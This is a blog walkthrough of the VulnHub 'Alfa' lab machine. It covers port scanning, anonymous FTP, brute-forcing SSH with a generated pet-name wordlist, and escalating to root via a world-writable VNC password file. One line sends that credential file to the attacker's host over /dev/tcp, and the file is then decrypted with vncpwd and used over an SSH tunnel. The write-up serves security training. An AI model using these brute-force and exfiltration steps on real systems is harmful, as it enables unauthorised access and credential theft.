</span></span><span class=line><span class=cl>$ nmap -p- nmap/10-allports-alfa 192.168.2.109 -v
</span></span><span class=line><span class=cl>Starting Nmap 7.80 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2021-04-22 02:53 EDT
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 192.168.2.109
</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.00040s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>Not shown: <span class=m>65530</span> closed ports
</span></span><span class=line><span class=cl>PORT      STATE SERVICE
</span></span><span class=line><span class=cl>21/tcp    open  ftp
</span></span><span class=line><span class=cl>80/tcp    open  http
</span></span><span class=line><span class=cl>139/tcp   open  netbios-ssn
</span></span><span class=line><span class=cl>445/tcp   open  microsoft-ds
</span></span><span class=line><span class=cl>65111/tcp open  unknown
</span></span><span class=line><span class=cl>MAC Address: 08:00:27:9C:8A:46 <span class=o>(</span>Oracle VirtualBox virtual NIC<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Read data files from: /usr/bin/../share/nmap
</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 36.32 seconds
</span></span><span class=line><span class=cl>           Raw packets sent: <span class=m>65536</span> <span class=o>(</span>2.884MB<span class=o>)</span> <span class=p>|</span> Rcvd: <span class=m>65536</span> <span class=o>(</span>2.621MB<span class=o>)</span>
</span></span></code></pre></div><p>Poking port 65111 with <code>nc</code> reveals it&rsquo;s SSH.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@iamf «alfa» «192.168.2.103» 
</span></span><span class=line><span class=cl>$ nc 192.168.2.109 <span class=m>65111</span>
</span></span><span class=line><span class=cl>SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u2
</span></span></code></pre></div><h2 id=enumeration>Enumeration<a class=anchor aria-hidden=true href=#enumeration>#</a></h2><h3 id=tcp-21---ftp>TCP 21 - FTP<a class=anchor aria-hidden=true href=#tcp-21---ftp>#</a></h3><p>Enumeration with on FTP discovers a potential username called <code>thomas</code>, an image file named <code>milo.jpg</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@iamf «alfa» «192.168.2.103» 
</span></span><span class=line><span class=cl>$ ftp 192.168.2.109 
</span></span><span class=line><span class=cl>Connected to 192.168.2.109.
</span></span><span class=line><span class=cl><span class=m>220</span> <span class=o>(</span>vsFTPd 3.0.3<span class=o>)</span>
</span></span><span class=line><span class=cl>Name <span class=o>(</span>192.168.2.109:root<span class=o>)</span>: anonymous
</span></span><span class=line><span class=cl><span class=m>331</span> Please specify the password.
</span></span><span class=line><span class=cl>Password:
</span></span><span class=line><span class=cl><span class=m>230</span> Login successful.
</span></span><span class=line><span class=cl>Remote system <span class=nb>type</span> is UNIX.
</span></span><span class=line><span class=cl>Using binary mode to transfer files.
</span></span><span class=line><span class=cl>ftp&gt; dir
</span></span><span class=line><span class=cl><span class=m>200</span> PORT <span class=nb>command</span> successful. Consider using PASV.
</span></span><span class=line><span class=cl><span class=m>150</span> Here comes the directory listing.
</span></span><span class=line><span class=cl>drwxr-xr-x    <span class=m>2</span> <span class=m>0</span>        <span class=m>0</span>            <span class=m>4096</span> Dec <span class=m>17</span> 13:02 thomas
</span></span><span class=line><span class=cl><span class=m>226</span> Directory send OK.
</span></span><span class=line><span class=cl>ftp&gt; <span class=nb>cd</span> thomas
</span></span><span class=line><span class=cl><span class=m>250</span> Directory successfully changed.
</span></span><span class=line><span class=cl>ftp&gt; dir
</span></span><span class=line><span class=cl><span class=m>200</span> PORT <span class=nb>command</span> successful. Consider using PASV.
</span></span><span class=line><span class=cl><span class=m>150</span> Here comes the directory listing.
</span></span><span class=line><span class=cl>-rw-r--r--    <span class=m>1</span> <span class=m>0</span>        <span class=m>0</span>          <span class=m>104068</span> Dec <span class=m>17</span> 12:49 milo.jpg
</span></span></code></pre></div><p><code>milo.jpg</code> is a picture of a dog.</p><p><div class=img-container><img src=imgs/image-20210613181756997.png alt=image-20210613181756997></div></p><h3 id=tcp-445---smb>TCP 445 - SMB<a class=anchor aria-hidden=true href=#tcp-445---smb>#</a></h3><p>On SMB, anonymous access is allowed but no read permission there.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@iamf «alfa» «192.168.2.103» 
</span></span><span class=line><span class=cl>$ crackmapexec smb 192.168.2.109 -u <span class=s1>&#39;ANONYMOUS&#39;</span> -p <span class=s1>&#39;&#39;</span> --shares
</span></span><span class=line><span class=cl>SMB         192.168.2.109   <span class=m>445</span>    ALFA             <span class=o>[</span>*<span class=o>]</span> Windows 6.1 <span class=o>(</span>name:ALFA<span class=o>)</span> <span class=o>(</span>domain:<span class=o>)</span> <span class=o>(</span>signing:False<span class=o>)</span> <span class=o>(</span>SMBv1:True<span class=o>)</span>
</span></span><span class=line><span class=cl>SMB         192.168.2.109   <span class=m>445</span>    ALFA             <span class=o>[</span>+<span class=o>]</span> <span class=se>\A</span>NONYMOUS: 
</span></span><span class=line><span class=cl>SMB         192.168.2.109   <span class=m>445</span>    ALFA             <span class=o>[</span>+<span class=o>]</span> Enumerated shares
</span></span><span class=line><span class=cl>SMB         192.168.2.109   <span class=m>445</span>    ALFA             Share           Permissions     Remark
</span></span><span class=line><span class=cl>SMB         192.168.2.109   <span class=m>445</span>    ALFA             -----           -----------     ------
</span></span><span class=line><span class=cl>SMB         192.168.2.109   <span class=m>445</span>    ALFA             print$                          Printer Drivers
</span></span><span class=line><span class=cl>SMB         192.168.2.109   <span class=m>445</span>    ALFA             IPC$                            IPC Service <span class=o>(</span>Samba 4.9.5-Debian<span class=o>)</span>
</span></span></code></pre></div><h3 id=tcp-80---web>TCP 80 - Web<a class=anchor aria-hidden=true href=#tcp-80---web>#</a></h3><p>Visiting port 80 shows a website titled with &ldquo;Alfa IT Solutions&rdquo;.</p><p><div class=img-container><img src=imgs/image-20210422143723577.png alt=image-20210422143723577></div></p><p>Nothing useful on the page source.</p><h4 id=gobuster>Gobuster<a class=anchor aria-hidden=true href=#gobuster>#</a></h4><p><code>gobuster</code> scan discovers a <code>robot.txt</code> file</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@iamf «alfa» «192.168.2.103» 
</span></span><span class=line><span class=cl>$ gobuster dir -u http://192.168.2.109/ -x html,txt,bak -w /opt/SecLists/Discovery/Web-Content/raft-large-directories.txt -o gobuster/gobuster-L-80 
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>Gobuster v3.1.0
</span></span><span class=line><span class=cl>by OJ Reeves <span class=o>(</span>@TheColonial<span class=o>)</span> <span class=p>&amp;</span> Christian Mehlmauer <span class=o>(</span>@firefart<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Url:                     http://192.168.2.109/
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Method:                  GET
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Threads:                 <span class=m>10</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Wordlist:                /opt/SecLists/Discovery/Web-Content/raft-large-directories.txt
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Negative Status codes:   <span class=m>404</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> User Agent:              gobuster/3.1.0
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Extensions:              html,txt,bak
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Timeout:                 <span class=nv>10s</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>2021/04/22 02:46:48 Starting gobuster in directory enumeration <span class=nv>mode</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>/js                   <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 311<span class=o>]</span> <span class=o>[</span>--&gt; http://192.168.2.109/js/<span class=o>]</span>
</span></span><span class=line><span class=cl>/images               <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 315<span class=o>]</span> <span class=o>[</span>--&gt; http://192.168.2.109/images/<span class=o>]</span>
</span></span><span class=line><span class=cl>/css                  <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 312<span class=o>]</span> <span class=o>[</span>--&gt; http://192.168.2.109/css/<span class=o>]</span>   
</span></span><span class=line><span class=cl>/index.html           <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 3870<span class=o>]</span>                                  
</span></span><span class=line><span class=cl>/fonts                <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 314<span class=o>]</span> <span class=o>[</span>--&gt; http://192.168.2.109/fonts/<span class=o>]</span> 
</span></span><span class=line><span class=cl>/robots.txt           <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 459<span class=o>]</span>                                   
</span></span><span class=line><span class=cl>/server-status        <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 278<span class=o>]</span> 
</span></span></code></pre></div><h4 id=robotstxt>robots.txt<a class=anchor aria-hidden=true href=#robotstxt>#</a></h4><p>Accessing <code>robots.txt</code> discovers some directories. But, these are just dummy.</p><p><div class=img-container><img src=imgs/image-20210422134810181.png alt=image-20210422134810181></div></p><p>Poking the <code>robots.txt</code> file with <code>curl</code> discovers a string which looks like a brainfuck language.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@iamf «alfa» «192.168.2.103» 
</span></span><span class=line><span class=cl>$ curl -s http://192.168.2.109/robots.txt
</span></span><span class=line><span class=cl>/home <span class=c1>#404</span>
</span></span><span class=line><span class=cl>/admin <span class=c1>#404</span>
</span></span><span class=line><span class=cl>/login <span class=c1>#404</span>
</span></span><span class=line><span class=cl>/images <span class=c1>#200, directory listing, nothing interesting</span>
</span></span><span class=line><span class=cl>/cgi-bin <span class=c1>#404</span>
</span></span><span class=line><span class=cl>/intranet <span class=c1>#404</span>
</span></span><span class=line><span class=cl>/wp-admin <span class=c1>#404</span>
</span></span><span class=line><span class=cl>/wp-login <span class=c1>#404</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>...&lt;SNIP&gt;...
</span></span><span class=line><span class=cl>++++++++++<span class=o>[</span>&gt;+&gt;+++&gt;+++++++&gt;++++++++++<span class=o>&lt;&lt;&lt;</span>&lt;-<span class=o>]</span>&gt;&gt;+++++++++++++++++.&gt;&gt;---.+++++++++++.------.-----.&lt;&lt;--.&gt;&gt;++++++++++++++++++.++.-----..-.+++.++.
</span></span></code></pre></div><p>Using <a href=https://www.dcode.fr/brainfuck-language>this site</a>, the string gets translated as <code>/alfa-support</code> .</p><p><div class=img-container><img src=imgs/image-20210613181246585.png alt=image-20210613181246585></div></p><h4 id=alfa-support>/alfa-support<a class=anchor aria-hidden=true href=#alfa-support>#</a></h4><p>On <code>/alfa-support</code>, there is a chat between Thomas as the employee and the IT support operator (I think?).</p><p><div class=img-container><img src=imgs/image-20210422143814423.png alt=image-20210422143814423></div></p><p>From the conversation above, I&rsquo;ll note that Thomas uses a password that consists of his(or her?) pet&rsquo;s name followed by 3 numerical digits.</p><h2 id=foothold>Foothold<a class=anchor aria-hidden=true href=#foothold>#</a></h2><h3 id=shell-as-thomas>Shell as Thomas<a class=anchor aria-hidden=true href=#shell-as-thomas>#</a></h3><h4 id=creating-wordlist>Creating Wordlist<a class=anchor aria-hidden=true href=#creating-wordlist>#</a></h4><p>From the previous FTP enumeration, &lsquo;milo&rsquo; is most likely the name of Thomas&rsquo;s pet. With <code>bash</code>, I could generate all the possible password used by Thomas.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@iamf «alfa» «192.168.2.103» 
</span></span><span class=line><span class=cl>$ <span class=k>for</span> i in <span class=o>{</span>000..999<span class=o>}</span><span class=p>;</span> <span class=k>do</span> <span class=nb>echo</span> <span class=s2>&#34;milo</span><span class=nv>$i</span><span class=s2>&#34;</span><span class=p>;</span> <span class=k>done</span> <span class=p>|</span> tee passwords
</span></span><span class=line><span class=cl>milo000
</span></span><span class=line><span class=cl>milo001
</span></span><span class=line><span class=cl>milo002
</span></span><span class=line><span class=cl>milo003
</span></span><span class=line><span class=cl>...&lt;snip&gt;...
</span></span></code></pre></div><h4 id=brute-force---ftp>Brute force - FTP<a class=anchor aria-hidden=true href=#brute-force---ftp>#</a></h4><p>I tried it with Hydra on FTP but returns nothing.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@iamf «alfa» «192.168.2.103» 
</span></span><span class=line><span class=cl>$ hydra -l thomas -P passwords ftp://192.168.2.103 
</span></span><span class=line><span class=cl>Hydra v9.0 <span class=o>(</span>c<span class=o>)</span> <span class=m>2019</span> by van Hauser/THC - Please <span class=k>do</span> not use in military or secret service organizations, or <span class=k>for</span> illegal purposes.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Hydra <span class=o>(</span>https://github.com/vanhauser-thc/thc-hydra<span class=o>)</span> starting at 2021-04-22 03:43:09
</span></span><span class=line><span class=cl><span class=o>[</span>WARNING<span class=o>]</span> Restorefile <span class=o>(</span>you have <span class=m>10</span> seconds to abort... <span class=o>(</span>use option -I to skip waiting<span class=o>))</span> from a previous session found, to prevent overwriting, ./hydra.restore
</span></span><span class=line><span class=cl><span class=o>[</span>DATA<span class=o>]</span> max <span class=m>16</span> tasks per <span class=m>1</span> server, overall <span class=m>16</span> tasks, <span class=m>1000</span> login tries <span class=o>(</span>l:1/p:1000<span class=o>)</span>, ~63 tries per task
</span></span><span class=line><span class=cl><span class=o>[</span>DATA<span class=o>]</span> attacking ftp://192.168.2.103:21/
</span></span><span class=line><span class=cl><span class=o>[</span>STATUS<span class=o>]</span> 320.00 tries/min, <span class=m>320</span> tries in 00:01h, <span class=m>713</span> to <span class=k>do</span> in 00:03h, <span class=m>16</span> active
</span></span><span class=line><span class=cl><span class=o>[</span>STATUS<span class=o>]</span> 317.00 tries/min, <span class=m>634</span> tries in 00:02h, <span class=m>399</span> to <span class=k>do</span> in 00:02h, <span class=m>16</span> active
</span></span><span class=line><span class=cl><span class=o>[</span>STATUS<span class=o>]</span> 315.67 tries/min, <span class=m>947</span> tries in 00:03h, <span class=m>86</span> to <span class=k>do</span> in 00:01h, <span class=m>16</span> active
</span></span><span class=line><span class=cl><span class=m>1</span> of <span class=m>1</span> target completed, <span class=m>0</span> valid passwords found
</span></span><span class=line><span class=cl><span class=o>[</span>WARNING<span class=o>]</span> Writing restore file because <span class=m>15</span> final worker threads did not <span class=nb>complete</span> <span class=k>until</span> end.
</span></span><span class=line><span class=cl><span class=o>[</span>ERROR<span class=o>]</span> <span class=m>15</span> targets did not resolve or could not be connected
</span></span><span class=line><span class=cl><span class=o>[</span>ERROR<span class=o>]</span> <span class=m>0</span> targets did not <span class=nb>complete</span>
</span></span><span class=line><span class=cl>Hydra <span class=o>(</span>https://github.com/vanhauser-thc/thc-hydra<span class=o>)</span> finished at 2021-04-22 03:46:35
</span></span></code></pre></div><h4 id=brute-force---ssh>Brute force - SSH<a class=anchor aria-hidden=true href=#brute-force---ssh>#</a></h4><p>This time I will use <code>crackmapexec</code> , and I will divide the wordlist into two files</p><ul><li>passwords1: 000-500</li><li>passwords2: 500-999</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>→ root@iamf «alfa» «192.168.2.103» 
</span></span><span class=line><span class=cl>$ crackmapexec ssh 192.168.2.109 -u thomas -p passwords2 --port <span class=m>65111</span>
</span></span></code></pre></div><p>After some minutes it returns one valid combination: <code>thomas:milo666</code></p><p><div class=img-container><img src=imgs/image-20210422151432013.png alt=image-20210422151432013></div></p><h4 id=ssh---thomas>SSH - Thomas<a class=anchor aria-hidden=true href=#ssh---thomas>#</a></h4><p>I&rsquo;ll just log in via SSH and grabs the flag.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@iamf «alfa» «192.168.2.103» 
</span></span><span class=line><span class=cl>$ ssh -p <span class=m>65111</span> thomas@192.168.2.109
</span></span><span class=line><span class=cl>thomas@192.168.2.109<span class=err>&#39;</span>s password: 
</span></span><span class=line><span class=cl>Linux Alfa 4.19.0-13-amd64 <span class=c1>#1 SMP Debian 4.19.160-2 (2020-11-28) x86_64</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>####################################################################</span>
</span></span><span class=line><span class=cl><span class=c1>#                  ,---------------------------,                   #</span>
</span></span><span class=line><span class=cl><span class=c1>#                  |  /---------------------\  |                   #</span>
</span></span><span class=line><span class=cl><span class=c1>#                  | |                       | |                   #</span>
</span></span><span class=line><span class=cl><span class=c1>#                  | |         +----+        | |                   #</span>
</span></span><span class=line><span class=cl><span class=c1>#                  | |         |ALFA|        | |                   #</span>
</span></span><span class=line><span class=cl><span class=c1>#                  | |         +----+        | |                   #</span>
</span></span><span class=line><span class=cl><span class=c1>#                  | |                       | |                   #</span>
</span></span><span class=line><span class=cl><span class=c1>#                  |  \_____________________/  |                   #</span>
</span></span><span class=line><span class=cl><span class=c1>#                  |___________________________|                   #</span>
</span></span><span class=line><span class=cl><span class=c1>#                ,---\_____     []     _______/------,             #</span>
</span></span><span class=line><span class=cl><span class=c1>#              /         /______________\           /|             #</span>
</span></span><span class=line><span class=cl><span class=c1>#            /___________________________________ /  | ___         #</span>
</span></span><span class=line><span class=cl><span class=c1>#            |                                   |   |    )        #</span>
</span></span><span class=line><span class=cl><span class=c1>#            |  _ _ _                 [-------]  |   |   (         #</span>
</span></span><span class=line><span class=cl><span class=c1>#            |  o o o                 [-------]  |  /    _)_       #</span>
</span></span><span class=line><span class=cl><span class=c1>#            |__________________________________ |/     /  /       #</span>
</span></span><span class=line><span class=cl><span class=c1>#        /-------------------------------------/|      ( )/        #</span>
</span></span><span class=line><span class=cl><span class=c1>#      /-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/ /                   #</span>
</span></span><span class=line><span class=cl><span class=c1>#    /-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/ /                     #</span>
</span></span><span class=line><span class=cl><span class=c1>#     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~                       #</span>
</span></span><span class=line><span class=cl><span class=c1>#  ██╗    ██╗███████╗██╗      ██████╗ ██████╗ ███╗   ███╗███████╗  #</span>
</span></span><span class=line><span class=cl><span class=c1>#  ██║    ██║██╔════╝██║     ██╔════╝██╔═══██╗████╗ ████║██╔════╝  #</span>
</span></span><span class=line><span class=cl><span class=c1>#  ██║ █╗ ██║█████╗  ██║     ██║     ██║   ██║██╔████╔██║█████╗    #</span>
</span></span><span class=line><span class=cl><span class=c1>#  ██║███╗██║██╔══╝  ██║     ██║     ██║   ██║██║╚██╔╝██║██╔══╝    #</span>
</span></span><span class=line><span class=cl><span class=c1>#  ╚███╔███╔╝███████╗███████╗╚██████╗╚██████╔╝██║ ╚═╝ ██║███████╗  #</span>
</span></span><span class=line><span class=cl><span class=c1>#   ╚══╝╚══╝ ╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚══════╝  #</span>
</span></span><span class=line><span class=cl><span class=c1>####################################################################</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>thomas@Alfa:~$ id
</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>1000<span class=o>(</span>thomas<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>1000<span class=o>(</span>thomas<span class=o>)</span> <span class=nv>grupos</span><span class=o>=</span>1000<span class=o>(</span>thomas<span class=o>)</span>,24<span class=o>(</span>cdrom<span class=o>)</span>,25<span class=o>(</span>floppy<span class=o>)</span>,29<span class=o>(</span>audio<span class=o>)</span>,30<span class=o>(</span>dip<span class=o>)</span>,44<span class=o>(</span>video<span class=o>)</span>,46<span class=o>(</span>plugdev<span class=o>)</span>,109<span class=o>(</span>netdev<span class=o>)</span>
</span></span><span class=line><span class=cl>thomas@Alfa:~$ ls -l
</span></span><span class=line><span class=cl>total <span class=m>4</span>
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> thomas thomas <span class=m>1332</span> dic <span class=m>20</span> 11:04 user.txt
</span></span></code></pre></div><h2 id=privilege-escalation>Privilege Escalation<a class=anchor aria-hidden=true href=#privilege-escalation>#</a></h2><h3 id=shell-as-root>Shell as root<a class=anchor aria-hidden=true href=#shell-as-root>#</a></h3><h4 id=internal-enumeration>Internal enumeration<a class=anchor aria-hidden=true href=#internal-enumeration>#</a></h4><p>In thomas&rsquo;s home directory, there is a file called <code>.remote-secret</code> and it is owned by root but world-writable.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>thomas@Alfa:~$ ls -la
</span></span><span class=line><span class=cl>total <span class=m>40</span>
</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>4</span> thomas thomas <span class=m>4096</span> dic <span class=m>20</span> 22:22 .
</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>3</span> root   root   <span class=m>4096</span> dic <span class=m>16</span> 07:58 ..
</span></span><span class=line><span class=cl>-rw------- <span class=m>1</span> thomas thomas    <span class=m>4</span> dic <span class=m>20</span> 22:22 .bash_history
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> thomas thomas  <span class=m>220</span> dic <span class=m>16</span> 07:58 .bash_logout
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> thomas thomas <span class=m>3526</span> dic <span class=m>16</span> 07:58 .bashrc
</span></span><span class=line><span class=cl>drwx------ <span class=m>3</span> thomas thomas <span class=m>4096</span> dic <span class=m>16</span> 21:15 .gnupg
</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>3</span> thomas thomas <span class=m>4096</span> dic <span class=m>16</span> 20:44 .local
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> thomas thomas  <span class=m>807</span> dic <span class=m>16</span> 07:58 .profile
</span></span><span class=line><span class=cl>-rwxrwxrwx <span class=m>1</span> root   root     <span class=m>16</span> dic <span class=m>17</span> 23:35 .remote_secret
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> thomas thomas <span class=m>1332</span> dic <span class=m>20</span> 11:04 user.txt
</span></span></code></pre></div><p>At first, I assumed it was some kind of service hijacking, but the file contents appeared to be encrypted.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>thomas@Alfa:~$ cat .remote_secret 
</span></span><span class=line><span class=cl>�<span class=s2>&#34;�Cc�&#34;</span>�Cc
</span></span></code></pre></div><p>Running <a href=https://github.com/DominicBreuker/pspy>pspy</a> discovers a VNC server running locally with root access on port 5901.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>2021/04/22 10:47:57 CMD: UID=0    PID=404    | /usr/bin/Xtigervnc :1 -desktop Alfa:1 (root) -auth /root/.Xauthority -geometry 1900x1200 -depth 24 -rfbwait 30000 -rfbauth /root/.vnc/passwd -rfbport 5901 -pn -localhost -SecurityTypes VncAuth    
</span></span></code></pre></div><h4 id=vnc-decrypt>VNC Decrypt<a class=anchor aria-hidden=true href=#vnc-decrypt>#</a></h4><p>This <code>.remote_secret</code> is a VNC password file and I could use <a href=https://github.com/jeroennijhof/vncpwd>vncpwd</a> to decrypt it (I&rsquo;ve also done this previously on <a href=https://fahmifj.github.io/writeups/hackthebox/htb-cascade/#decrypt-vnc-password>HTB: Cascade</a>). I&rsquo;ll transfer the file to my attacking machine and decrypt it there.</p><p>On Alfa:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>thomas@Alfa:~$ cat .remote_secret &gt; /dev/tcp/192.168.2.103/9000
</span></span></code></pre></div><p>On my Kali:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@iamf «alfa» «192.168.2.103» 
</span></span><span class=line><span class=cl>$ nc -nvlp <span class=m>9000</span> &gt; remote_secret
</span></span><span class=line><span class=cl>listening on <span class=o>[</span>any<span class=o>]</span> <span class=m>9000</span> ...
</span></span><span class=line><span class=cl>connect to <span class=o>[</span>192.168.2.103<span class=o>]</span> from <span class=o>(</span>UNKNOWN<span class=o>)</span> <span class=o>[</span>192.168.2.109<span class=o>]</span> <span class=m>57532</span>
</span></span></code></pre></div><p>The file content is decrypted to <code>k!LL3rSs</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@iamf «alfa» «192.168.2.103» 
</span></span><span class=line><span class=cl>$ ./vncpwd remote_secret 
</span></span><span class=line><span class=cl>Password: k!LL3rSs
</span></span></code></pre></div><p>I tried the password on root, but it didn&rsquo;t work. The next option here is to access the VNC server using this password.</p><h4 id=accessing-vnc>Accessing VNC<a class=anchor aria-hidden=true href=#accessing-vnc>#</a></h4><p>Since the VNC server is not accessible from outside, I&rsquo;ll need a port forwarding to interact with it.</p><p>On thomas&rsquo;s session</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>thomas@Alfa:~$ ~C
</span></span><span class=line><span class=cl>ssh&gt; -L 5901:localhost:5901 
</span></span><span class=line><span class=cl>Forwarding port.
</span></span></code></pre></div><p>That will create a tunnel from my Kali localhost:5901 => Alfa&rsquo;s localhost:5901</p><p>Now I can try to connect to the VNC server using <code>vncviewer</code> (it&rsquo;s preinstalled on Kali) and supply the <code>remote_secret</code> file to <code>-password</code> option.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@iamf «alfa» «192.168.2.103»  
</span></span><span class=line><span class=cl>$ vncviewer -passwd remote_secret 127.0.0.1:5901
</span></span><span class=line><span class=cl>Connected to RFB server, using protocol version 3.8
</span></span><span class=line><span class=cl>Performing standard VNC authentication
</span></span><span class=line><span class=cl>Authentication successful
</span></span><span class=line><span class=cl>Desktop name <span class=s2>&#34;Alfa:1 (root)&#34;</span>
</span></span><span class=line><span class=cl>VNC server default format:
</span></span><span class=line><span class=cl>  <span class=m>32</span> bits per pixel.
</span></span><span class=line><span class=cl>  Least significant byte first in each pixel.
</span></span><span class=line><span class=cl>  True colour: max red <span class=m>255</span> green <span class=m>255</span> blue 255, <span class=nb>shift</span> red <span class=m>16</span> green <span class=m>8</span> blue <span class=m>0</span>
</span></span><span class=line><span class=cl>Using default colormap which is TrueColor.  Pixel format:
</span></span><span class=line><span class=cl>  <span class=m>32</span> bits per pixel.
</span></span><span class=line><span class=cl>  Least significant byte first in each pixel.
</span></span><span class=line><span class=cl>  True colour: max red <span class=m>255</span> green <span class=m>255</span> blue 255, <span class=nb>shift</span> red <span class=m>16</span> green <span class=m>8</span> blue <span class=m>0</span>
</span></span><span class=line><span class=cl>Same machine: preferring raw encoding
</span></span></code></pre></div><p>It opens this Windows, and I&rsquo;m already on root.</p><p><div class=img-container><img src=imgs/image-20210422160633799.png alt=image-20210422160633799></div></p><p>To be honest, this is actually guessing.</p><p>At first I doubt that this remote_secret is shared with root user, but that&rsquo;s how I pwned this machine.</p><div class=post-references><h2>Reference</h2><ul><li><a href=https://int0x33.medium.com/day-70-hijacking-vnc-enum-brute-access-and-crack-d3d18a4601cc target=_blank rel="noopener noreferrer">https://int0x33.medium.com/day-70-hijacking-vnc-enum-brute-access-and-crack-d3d18a4601cc</a></li></ul></div></div></div><footer class=post-footer><ul class=post-tags><li><a href=https://fahmifj.github.io/tags/linux/>Linux</a></li><li><a href=https://fahmifj.github.io/tags/brainfuck/>Brainfuck</a></li><li><a href=https://fahmifj.github.io/tags/brute-force/>Brute-force</a></li><li><a href=https://fahmifj.github.io/tags/hydra/>Hydra</a></li><li><a href=https://fahmifj.github.io/tags/tunneling/>Tunneling</a></li><li><a href=https://fahmifj.github.io/tags/vnc/>VNC</a></li><li><a href=https://fahmifj.github.io/tags/vncpwd/>vncpwd</a></li><li><a href=https://fahmifj.github.io/tags/vncviewer/>vncviewer</a></li></ul><div class=share-buttons><a target=_blank rel="noopener noreferrer" aria-label="share VulnHub - Alfa on twitter" href="https://twitter.com/intent/tweet/?text=VulnHub%20-%20Alfa&url=https%3a%2f%2ffahmifj.github.io%2fvulnhub%2falfa%2f&hashtags=Linux%2cBrainfuck%2cBrute-force%2cHydra%2cTunneling%2cVNC%2cvncpwd%2cvncviewer"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 